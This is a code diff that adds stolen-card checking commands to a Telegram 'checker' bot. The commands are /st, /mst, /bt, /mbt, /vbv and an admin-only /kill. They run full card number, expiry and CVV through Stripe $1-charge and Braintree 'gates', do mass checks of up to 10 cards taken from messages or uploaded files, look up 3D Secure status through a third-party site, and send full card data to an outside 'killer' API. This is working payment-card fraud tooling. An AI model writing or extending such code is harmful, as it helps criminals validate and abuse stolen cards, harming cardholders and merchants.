@@ -5,6 +5,8 @@ import re
 import requests
 import asyncio
 import time
+import aiohttp
+import html
 from datetime import datetime
 from typing import Optional, Dict
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -126,6 +128,52 @@ proxy_module = importlib.util.module_from_spec(proxy_spec)
 proxy_spec.loader.exec_module(proxy_module)
 check_proxy_func = proxy_module.check_proxy
 format_proxy_result = proxy_module.format_proxy_result
+
+stripe_charge_spec = importlib.util.spec_from_file_location("stripe_charge", "gates/stripe charge/stripe 1$.py")
+stripe_charge_module = importlib.util.module_from_spec(stripe_charge_spec)
+stripe_charge_spec.loader.exec_module(stripe_charge_module)
+stripe_charge_check = stripe_charge_module.check_card
+
+braintree_bt_spec = importlib.util.spec_from_file_location("braintree_bt", "gates/braintree bt/braintree.py")
+braintree_bt_module = importlib.util.module_from_spec(braintree_bt_spec)
+braintree_bt_spec.loader.exec_module(braintree_bt_module)
+braintree_bt_check = braintree_bt_module.check_card
+
+async def get_bin_info(bin_number):
+    """Get BIN information from API"""
+    try:
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            url = f"https://bins.antipublic.cc/bins/{bin_number}"
+            async with session.get(url) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    return {
+                        'type': data.get('brand', 'N/A'),
+                        'country': data.get('country_name', 'N/A'),
+                        'bank': data.get('bank', 'N/A')
+                    }
+    except Exception:
+        pass
+    return {
+        'type': 'N/A',
+        'country': 'N/A',
+        'bank': 'N/A'
+    }
+
+async def get_vbv_info(cc_number):
+    """Get VBV (3D Secure) information from API"""
+    try:
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            url = f"https://ronak.xyz/vbv.php?cc={cc_number}"
+            async with session.get(url) as response:
+                if response.status == 200:
+                    text = await response.text()
+                    return text.strip() if text else 'N/A'
+    except Exception:
+        pass
+    return 'N/A'
 
 load_dotenv()
 
@@ -947,6 +995,68 @@ async def mbin_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         + "\n".join(results) +
         "\n\n━━━━━━━━━━━━━━━━━━━━━"
     )
+
+async def vbv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Check VBV status for a card"""
+    if not is_registered(update.effective_user.id):
+        await update.message.reply_text("⚠️ Please register first using /register")
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "❌ Usage: /vbv <card|mm|yy|cvv>\n"
+            "Example: /vbv 4532123456789012|12|25|123"
+        )
+        return
+    
+    import time
+    start_time = time.time()
+    
+    card_input = context.args[0]
+    parts = card_input.split('|')
+    
+    if len(parts) < 1:
+        await update.message.reply_text("❌ Invalid card format!")
+        return
+    
+    card_number = parts[0]
+    if not (card_number.isdigit() and 13 <= len(card_number) <= 19):
+        await update.message.reply_text("❌ Invalid card number!")
+        return
+    
+    try:
+        vbv_info = await get_vbv_info(card_number)
+        
+        bin_number = card_number[:6]
+        bin_response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
+        bin_info = bin_response.json() if bin_response.status_code == 200 else {}
+        
+        time_taken = time.time() - start_time
+        requester_username = update.effective_user.username or update.effective_user.first_name or "Unknown"
+        
+        masked_card = f"{card_number[:6]}******{card_number[-4:]}"
+        if len(parts) >= 4:
+            masked_card = f"{card_number[:6]}******{card_number[-4:]}|{parts[1]}|{parts[2]}|{parts[3]}"
+        
+        response = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
+𝑽𝑩𝑽
+━━━━━━━━━
+𝐂𝐂 ➜ <code>{html.escape(masked_card)}</code>
+𝑽𝑩𝑽 ➜ {html.escape(vbv_info)}
+━━━━━━━━━
+𝐁𝐈𝐍 ➜ {bin_number}
+𝐓𝐘𝐏𝐄 ➜ {bin_info.get('brand', 'N/A')} {bin_info.get('type', 'N/A')}
+𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}
+𝐁𝐀𝐍𝐊 ➜ {bin_info.get('bank', 'N/A')}
+━━━━━━━━━
+𝗧/𝘁 : {time_taken:.2f}s
+𝐑𝐄𝐐 : @{requester_username}
+𝐃𝐄𝐕 : @MUMIRU"""
+        
+        await update.message.reply_text(response, parse_mode='HTML')
+        
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)}")
 
 async def gbin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_registered(update.effective_user.id):
@@ -4819,6 +4929,489 @@ async def check_paypal_reply(update: Update, context: ContextTypes.DEFAULT_TYPE)
     await check_paypal(update, context)
 
 
+async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Stripe Charge single check - /st CC|MM|YY|CVV"""
+    user_id = update.effective_user.id
+    username = update.effective_user.username or update.effective_user.first_name or "Unknown"
+    if not is_registered(user_id):
+        await update.message.reply_text("⚠️ Please register first using /register")
+        return
+    
+    card_data = None
+    
+    if update.message.reply_to_message:
+        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
+        card_data = extract_cc_from_text(replied_text)
+    
+    if not card_data and context.args:
+        card_input = ' '.join(context.args)
+        card_data = extract_cc_from_text(card_input)
+    
+    if not card_data:
+        await update.message.reply_text(
+            "╔═══════════════════════════════╗\n"
+            "   💳 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $1\n"
+            "╚═══════════════════════════════╝\n\n"
+            "Usage: /st CC|MM|YY|CVV\n"
+            "Example: /st 5484460739505683|04|29|280\n\n"
+            "Or reply to a message containing CC with /st"
+        )
+        return
+    
+    checking_msg = await update.message.reply_text("⏳ Checking Stripe Charge...")
+    
+    bin_number = card_data['number'][:6]
+    bin_info = await get_bin_info(bin_number)
+    vbv_info = await get_vbv_info(card_data['number'])
+    
+    start_time = time.time()
+    result = await asyncio.to_thread(
+        stripe_charge_check,
+        card_data['number'],
+        card_data['month'],
+        card_data['year'],
+        card_data['cvv']
+    )
+    time_taken = round(time.time() - start_time, 2)
+    
+    cc_display = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
+    cc_escaped = html.escape(cc_display)
+    
+    if result['status'] == 'CHARGED':
+        status_text = "CHARGED 💳"
+    elif result['status'] == 'APPROVED':
+        status_text = "APPROVED ✅"
+    elif result['status'] == 'DECLINED':
+        status_text = "DECLINED ❌"
+    else:
+        status_text = f"{result['status']} ⚠️"
+    
+    msg = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
+𝑺𝑻𝑹𝑰𝑷𝑬 1$
+━━━━━━━━━
+𝐂𝐂 ➜ <code>{cc_escaped}</code>
+𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_text}
+𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {html.escape(result['message'])}
+𝑽𝑩𝑽  ➜ {html.escape(vbv_info)}
+━━━━━━━━━
+𝐁𝐈𝐍 ➜ {html.escape(bin_number)}
+𝐓𝐘𝐏𝐄 ➜ {html.escape(bin_info.get('type', 'N/A'))}
+𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {html.escape(bin_info.get('country', 'N/A'))}
+𝐁𝐀𝐍𝐊 ➜ {html.escape(bin_info.get('bank', 'N/A'))}
+━━━━━━━━━
+𝗧/𝘁 : {time_taken}s 𝐏𝐫𝐨𝐱𝐲 : None
+𝐑𝐄𝐐 : @{html.escape(username)}
+𝐃𝐄𝐕 : @mumiru"""
+    
+    await checking_msg.edit_text(msg, parse_mode='HTML')
+
+
+async def mst_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Stripe Charge mass check - /mst (max 10 CCs)"""
+    user_id = update.effective_user.id
+    if not is_registered(user_id):
+        await update.message.reply_text("⚠️ Please register first using /register")
+        return
+    
+    cards = []
+    
+    if update.message.reply_to_message:
+        if update.message.reply_to_message.document:
+            try:
+                file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
+                file_content = await file.download_as_bytearray()
+                text_content = file_content.decode('utf-8', errors='ignore')
+                cards = parse_cards_from_text(text_content)
+            except Exception as e:
+                await update.message.reply_text(f"❌ Error reading file: {e}")
+                return
+        else:
+            replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
+            cards = parse_cards_from_text(replied_text)
+    
+    if not cards and context.args:
+        text_input = ' '.join(context.args)
+        cards = parse_cards_from_text(update.message.text or text_input)
+    
+    if not cards:
+        await update.message.reply_text(
+            "╔═══════════════════════════════╗\n"
+            "   💳 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 𝗠𝗔𝗦𝗦\n"
+            "╚═══════════════════════════════╝\n\n"
+            "Usage: /mst CC|MM|YY|CVV (multiple lines)\n"
+            "Or reply to a file with /mst\n"
+            "Max: 10 CCs at once\n\n"
+            "Example:\n"
+            "/mst 5484460739505683|04|29|280\n"
+            "5484460739505684|05|30|281\n"
+            "5484460739505685|06|31|282"
+        )
+        return
+    
+    cards = cards[:10]
+    
+    status_msg = await update.message.reply_text(
+        f"⏳ Checking {len(cards)} cards via Stripe Charge...\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    )
+    
+    approved = []
+    declined = []
+    errors = []
+    
+    for i, card in enumerate(cards):
+        parts = card.split('|')
+        if len(parts) != 4:
+            continue
+        
+        cc, mm, yy, cvv = parts
+        if len(yy) == 2:
+            yy = f"20{yy}"
+        
+        result = await asyncio.to_thread(stripe_charge_check, cc, mm, yy, cvv)
+        
+        if result['status'] == 'APPROVED':
+            approved.append(f"✅ {card}")
+        elif result['status'] == 'DECLINED':
+            declined.append(f"❌ {card[:20]}... - {result['message'][:30]}")
+        else:
+            errors.append(f"⚠️ {card[:20]}... - {result['message'][:30]}")
+        
+        if (i + 1) % 3 == 0:
+            await status_msg.edit_text(
+                f"⏳ Checking Stripe Charge... ({i+1}/{len(cards)})\n"
+                f"✅ Approved: {len(approved)} | ❌ Declined: {len(declined)} | ⚠️ Errors: {len(errors)}"
+            )
+    
+    msg = (
+        "╔═══════════════════════════════╗\n"
+        "   💳 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 𝗥𝗘𝗦𝗨𝗟𝗧𝗦\n"
+        "╚═══════════════════════════════╝\n\n"
+        f"📊 Total: {len(cards)} | ✅ {len(approved)} | ❌ {len(declined)} | ⚠️ {len(errors)}\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    )
+    
+    if approved:
+        msg += "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 (𝗖𝗛𝗔𝗥𝗚𝗘𝗗 $1):\n"
+        for a in approved[:5]:
+            msg += f"{a}\n"
+        if len(approved) > 5:
+            msg += f"... and {len(approved)-5} more\n"
+        msg += "\n"
+    
+    if declined:
+        msg += "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗:\n"
+        for d in declined[:5]:
+            msg += f"{d}\n"
+        if len(declined) > 5:
+            msg += f"... and {len(declined)-5} more\n"
+    
+    msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    
+    await status_msg.edit_text(msg)
+
+
+async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Kill gate - Admin only - /kill CC|MM|YY|CVV"""
+    user_id = update.effective_user.id
+    username = update.effective_user.username or ""
+    
+    if not is_admin(user_id, username):
+        await update.message.reply_text("❌ This command is for admins only!")
+        return
+    
+    card_data = None
+    
+    if update.message.reply_to_message:
+        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
+        card_data = extract_cc_from_text(replied_text)
+    
+    if not card_data and context.args:
+        card_input = ' '.join(context.args)
+        card_data = extract_cc_from_text(card_input)
+    
+    if not card_data:
+        await update.message.reply_text(
+            "╔═══════════════════════════════╗\n"
+            "   💀 𝗞𝗜𝗟𝗟 𝗚𝗔𝗧𝗘 (𝗔𝗗𝗠𝗜𝗡)\n"
+            "╚═══════════════════════════════╝\n\n"
+            "Usage: /kill CC|MM|YY|CVV\n"
+            "Example: /kill 5484460739505683|04|29|280\n\n"
+            "Or reply to a message containing CC with /kill"
+        )
+        return
+    
+    checking_msg = await update.message.reply_text("⏳ Processing Kill Gate...")
+    
+    bin_number = card_data['number'][:6]
+    bin_info = await get_bin_info(bin_number)
+    
+    start_time = time.time()
+    
+    cc_formatted = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
+    cc_encoded = cc_formatted.replace("|", "%7C")
+    
+    api_url = f"https://killer-2-gates-pyjk.vercel.app/ko/cc={cc_encoded}?key=anmokupvtko"
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as response:
+                raw_response = await response.text()
+                status_code = response.status
+    except Exception as e:
+        raw_response = str(e)
+        status_code = 0
+    
+    time_taken = round(time.time() - start_time, 2)
+    
+    cc_display = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
+    cc_escaped = html.escape(cc_display)
+    
+    try:
+        response_json = json.loads(raw_response)
+        if isinstance(response_json, dict):
+            result_msg = response_json.get('message', '') or response_json.get('result', '') or response_json.get('status', '') or raw_response
+        else:
+            result_msg = raw_response
+    except:
+        result_msg = raw_response
+    
+    result_lower = result_msg.lower() if isinstance(result_msg, str) else str(result_msg).lower()
+    
+    if 'killed' in result_lower or 'success' in result_lower or 'approved' in result_lower or 'charged' in result_lower:
+        status_text = "WORK DONE ✅"
+    else:
+        status_text = "DECLINED ❌"
+    
+    msg = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
+💀 𝐊𝐈𝐋𝐋 𝐆𝐀𝐓𝐄
+━━━━━━━━━
+𝐂𝐂 ➜ <code>{cc_escaped}</code>
+𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_text}
+𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {html.escape(str(result_msg)[:200])}
+━━━━━━━━━
+𝐁𝐈𝐍 ➜ {html.escape(bin_number)}
+𝐓𝐘𝐏𝐄 ➜ {html.escape(bin_info.get('type', 'N/A'))}
+𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {html.escape(bin_info.get('country', 'N/A'))}
+𝐁𝐀𝐍𝐊 ➜ {html.escape(bin_info.get('bank', 'N/A'))}
+━━━━━━━━━
+𝗧/𝘁 : {time_taken}s 𝐏𝐫𝐨𝐱𝐲 : None
+𝐑𝐄𝐐 : @{html.escape(username)}
+𝐃𝐄𝐕 : @mumiru"""
+    
+    await checking_msg.edit_text(msg, parse_mode='HTML')
+
+
+async def bt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Braintree BT single check - /bt CC|MM|YY|CVV"""
+    user_id = update.effective_user.id
+    username = update.effective_user.username or update.effective_user.first_name or "Unknown"
+    if not is_registered(user_id):
+        await update.message.reply_text("⚠️ Please register first using /register")
+        return
+    
+    card_data = None
+    
+    if update.message.reply_to_message:
+        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
+        card_data = extract_cc_from_text(replied_text)
+    
+    if not card_data and context.args:
+        card_input = ' '.join(context.args)
+        card_data = extract_cc_from_text(card_input)
+    
+    if not card_data:
+        await update.message.reply_text(
+            "╔═══════════════════════════════╗\n"
+            "   🌳 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗕𝗧 𝗖𝗛𝗘𝗖𝗞\n"
+            "╚═══════════════════════════════╝\n\n"
+            "Usage: /bt CC|MM|YY|CVV\n"
+            "Example: /bt 5484460739505683|04|29|280\n\n"
+            "Or reply to a message containing CC with /bt"
+        )
+        return
+    
+    checking_msg = await update.message.reply_text("⏳ Checking Braintree BT...")
+    
+    bin_number = card_data['number'][:6]
+    bin_info = await get_bin_info(bin_number)
+    vbv_info = await get_vbv_info(card_data['number'])
+    
+    start_time = time.time()
+    result = await asyncio.to_thread(
+        braintree_bt_check,
+        card_data['number'],
+        card_data['month'],
+        card_data['year'],
+        card_data['cvv']
+    )
+    time_taken = round(time.time() - start_time, 2)
+    
+    cc_display = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
+    cc_escaped = html.escape(cc_display)
+    
+    if result['status'] == 'CHARGED':
+        status_text = "CHARGED 💳"
+    elif result['status'] == 'APPROVED':
+        status_text = "APPROVED ✅"
+    elif result['status'] == 'DECLINED':
+        status_text = "DECLINED ❌"
+    else:
+        status_text = f"{result['status']} ⚠️"
+    
+    msg = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
+𝐛𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐚𝐮𝐭𝐡
+━━━━━━━━━
+𝐂𝐂 ➜ <code>{cc_escaped}</code>
+𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_text}
+𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {html.escape(result['message'])}
+𝑽𝑩𝑽 ➜ {html.escape(vbv_info)}
+━━━━━━━━━
+𝐁𝐈𝐍 ➜ {html.escape(bin_number)}
+𝐓𝐘𝐏𝐄 ➜ {html.escape(bin_info.get('type', 'N/A'))}
+𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {html.escape(bin_info.get('country', 'N/A'))}
+𝐁𝐀𝐍𝐊 ➜ {html.escape(bin_info.get('bank', 'N/A'))}
+━━━━━━━━━
+𝗧/𝘁 : {time_taken}s 𝐏𝐫𝐨𝐱𝐲 : None
+𝐑𝐄𝐐 : @{html.escape(username)}
+𝐃𝐄𝐕 : @mumiru"""
+    
+    await checking_msg.edit_text(msg, parse_mode='HTML')
+
+
+async def mbt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Braintree BT mass check - /mbt (max 10 CCs)"""
+    user_id = update.effective_user.id
+    if not is_registered(user_id):
+        await update.message.reply_text("⚠️ Please register first using /register")
+        return
+    
+    cards = []
+    
+    if update.message.reply_to_message:
+        if update.message.reply_to_message.document:
+            try:
+                file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
+                file_content = await file.download_as_bytearray()
+                text_content = file_content.decode('utf-8', errors='ignore')
+                cards = parse_cards_from_text(text_content)
+            except Exception as e:
+                await update.message.reply_text(f"❌ Error reading file: {e}")
+                return
+        else:
+            replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
+            cards = parse_cards_from_text(replied_text)
+    
+    if not cards and context.args:
+        text_input = ' '.join(context.args)
+        cards = parse_cards_from_text(update.message.text or text_input)
+    
+    if not cards:
+        await update.message.reply_text(
+            "╔═══════════════════════════════╗\n"
+            "   🌳 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗕𝗧 𝗠𝗔𝗦𝗦\n"
+            "╚═══════════════════════════════╝\n\n"
+            "Usage: /mbt CC|MM|YY|CVV (multiple lines)\n"
+            "Or reply to a file with /mbt\n"
+            "Max: 10 CCs at once\n\n"
+            "Example:\n"
+            "/mbt 5484460739505683|04|29|280\n"
+            "5484460739505684|05|30|281\n"
+            "5484460739505685|06|31|282"
+        )
+        return
+    
+    cards = cards[:10]
+    
+    status_msg = await update.message.reply_text(
+        f"⏳ Checking {len(cards)} cards via Braintree BT...\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    )
+    
+    approved = []
+    declined = []
+    errors = []
+    
+    for i, card in enumerate(cards):
+        parts = card.split('|')
+        if len(parts) != 4:
+            continue
+        
+        cc, mm, yy, cvv = parts
+        if len(yy) == 2:
+            yy = f"20{yy}"
+        
+        result = await asyncio.to_thread(braintree_bt_check, cc, mm, yy, cvv)
+        
+        if result['status'] == 'APPROVED':
+            approved.append(f"✅ {card}")
+        elif result['status'] == 'DECLINED':
+            declined.append(f"❌ {card[:20]}... - {result['message'][:30]}")
+        else:
+            errors.append(f"⚠️ {card[:20]}... - {result['message'][:30]}")
+        
+        if (i + 1) % 3 == 0:
+            await status_msg.edit_text(
+                f"⏳ Checking Braintree BT... ({i+1}/{len(cards)})\n"
+                f"✅ Approved: {len(approved)} | ❌ Declined: {len(declined)} | ⚠️ Errors: {len(errors)}"
+            )
+    
+    msg = (
+        "╔═══════════════════════════════╗\n"
+        "   🌳 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗕𝗧 𝗥𝗘𝗦𝗨𝗟𝗧𝗦\n"
+        "╚═══════════════════════════════╝\n\n"
+        f"📊 Total: {len(cards)} | ✅ {len(approved)} | ❌ {len(declined)} | ⚠️ {len(errors)}\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    )
+    
+    if approved:
+        msg += "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 (𝗖𝗛𝗔𝗥𝗚𝗘𝗗):\n"
+        for a in approved[:5]:
+            msg += f"{a}\n"
+        if len(approved) > 5:
+            msg += f"... and {len(approved)-5} more\n"
+        msg += "\n"
+    
+    if declined:
+        msg += "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗:\n"
+        for d in declined[:5]:
+            msg += f"{d}\n"
+        if len(declined) > 5:
+            msg += f"... and {len(declined)-5} more\n"
+    
+    msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    
+    await status_msg.edit_text(msg)
+
+
+async def st_reply_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /st when replying to a message"""
+    if not update.message.reply_to_message:
+        return
+    await st_command(update, context)
+
+
+async def bt_reply_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /bt when replying to a message"""
+    if not update.message.reply_to_message:
+        return
+    await bt_command(update, context)
+
+
+async def mst_file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /mst when replying to a file"""
+    if not update.message.reply_to_message:
+        return
+    await mst_command(update, context)
+
+
+async def mbt_file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /mbt when replying to a file"""
+    if not update.message.reply_to_message:
+        return
+    await mbt_command(update, context)
+
+
 async def banned_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Show banned users list"""
     user_id = update.effective_user.id
@@ -5564,6 +6157,7 @@ def main():
     application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^\.cmd(s)?$'), cmd))
     application.add_handler(CommandHandler("bin", bin_check))
     application.add_handler(CommandHandler("mbin", mbin_check))
+    application.add_handler(CommandHandler("vbv", vbv_command))
     application.add_handler(CommandHandler("gen", gen_card))
     application.add_handler(CommandHandler("fake", fake_command))
     application.add_handler(CommandHandler("sk", sk_command))
@@ -5602,6 +6196,15 @@ def main():
     application.add_handler(CommandHandler("paypal", check_paypal))
     application.add_handler(CommandHandler("mpp", check_paypal_mass))
     application.add_handler(CommandHandler("mpaypal", check_paypal_mass))
+    application.add_handler(CommandHandler("st", st_command))
+    application.add_handler(CommandHandler("mst", mst_command))
+    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/st$'), st_reply_handler))
+    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/mst'), mst_file_handler))
+    application.add_handler(CommandHandler("bt", bt_command))
+    application.add_handler(CommandHandler("kill", kill_command))
+    application.add_handler(CommandHandler("mbt", mbt_command))
+    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/bt$'), bt_reply_handler))
+    application.add_handler(MessageHandler(filters.REPLY & filters.COMMAND & filters.Regex(r'^/mbt'), mbt_file_handler))
     application.add_handler(CommandHandler("cr", check_crunchyroll))
     application.add_handler(crunchyroll_handler)
     application.add_handler(CommandHandler("ms", check_microsoft))
